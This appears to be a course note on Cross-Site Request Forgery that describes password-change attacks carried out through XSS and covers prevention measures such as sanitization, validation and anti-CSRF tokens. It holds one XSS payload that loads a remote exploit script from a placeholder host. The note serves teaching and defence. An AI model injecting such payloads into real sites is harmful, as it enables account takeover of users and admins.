---
sticker: lucide//curly-braces
---

The third type of front end vulnerability that is caused by unfiltered user input isÂ [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf).Â `CSRF`Â attacks may utilizeÂ `XSS`Â vulnerabilities to perform certain queries, andÂ `API`Â calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.

A commonÂ `CSRF`Â attack to gain higher privileged access to a web application is to craft aÂ `JavaScript`Â payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing theÂ `JavaScript`Â `CSRF`Â payload), theÂ `JavaScript`Â code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.

`CSRF`Â can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of usingÂ `JavaScript`Â code that would return the session cookie, we would load a remoteÂ `.js`Â (`JavaScript`) file, as follows:

Code:Â html

```html
"><script src=//www.example.com/exploit.js></script>
```

TheÂ `exploit.js`Â file would contain the maliciousÂ `JavaScript`Â code that changes the user's password. Developing theÂ `exploit.js`Â in this case requires knowledge of this web application's password changing procedure andÂ `APIs`. The attacker would need to createÂ `JavaScript`Â code that would replicate the desired functionality and automatically carry it out (i.e.,Â `JavaScript`Â code that changes our password for this specific web application).

---

## Prevention

Though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end before it reaches the back end, and especially if this code may be displayed directly on the client-side without communicating with the back end. Two main controls must be applied when accepting user input:

|Type|Description|
|---|---|
|`Sanitization`|Removing special characters and non-standard characters from user input before displaying it or storing it.|
|`Validation`|Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)|

Furthermore, it is also important to sanitize displayed output and clear any special/non-standard characters. In case an attacker manages to bypass front end and back end sanitization and validation filters, it will still not cause any harm on the front end.

Once we sanitize and/or validate user input and displayed output, we should be able to prevent attacks likeÂ `HTML Injection`,Â `XSS`, orÂ `CSRF`. Another solution would be to implement aÂ [web application firewall (WAF)](https://en.wikipedia.org/wiki/Web_application_firewall), which should help to prevent injection attempts automatically. However, it should be noted that WAF solutions can potentially be bypassed, so developers should follow coding best practices and not merely rely on an appliance to detect/block attacks.

As forÂ `CSRF`, many modern browsers have built-in anti-CSRF measures, which prevent automatically executingÂ `JavaScript`Â code. Furthermore, many modern web applications have anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e.,Â `anti-CSRF`Â token, orÂ `http-only`/`X-XSS-Protection`). Certain other measures can be taken from a functional level, like requiring the user to input their password before changing it. Many of these security measures can be bypassed, and therefore these types of vulnerabilities can still pose a major threat to the users of a web application. This is why these precautions should only be relied upon as a secondary measure, and developers should always ensure that their code is not vulnerable to any of these attacks.

ThisÂ [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)Â from OWASP discusses the attack and prevention measures in greater detail.

[Previous](Cross-Site%20Scripting%20(XSS).md)
